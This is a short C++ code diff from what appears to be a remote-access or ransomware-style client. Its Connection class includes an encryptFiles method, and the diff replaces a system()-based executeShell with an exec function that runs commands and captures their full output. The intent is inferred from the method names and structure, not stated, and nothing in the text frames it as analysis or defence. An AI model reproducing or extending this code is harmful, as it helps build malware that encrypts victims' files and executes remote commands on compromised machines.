@@ -105,12 +105,23 @@ void Connection::encryptFiles(string path) {
     }
 }
 
-
-void Connection::executeShell(string shell) {
-    string output = to_string(system(shell.c_str()));
-    sendMessage(reinterpret_cast<const char *>(&output));
-    return;
+std::string exec(const char *cmd) {
+        char buffer[128];
+        std::string result = "";
+        FILE *pipe = _popen(cmd, "r");
+        if (!pipe) throw std::runtime_error("popen() failed!");
+        try {
+            while (fgets(buffer, sizeof buffer, pipe) != NULL) {
+                result += buffer;
+            }
+        } catch (...) {
+            _pclose(pipe);
+            throw;
+        }
+        _pclose(pipe);
+        return result;
 }
+
 
 
 void Connection::connection() {
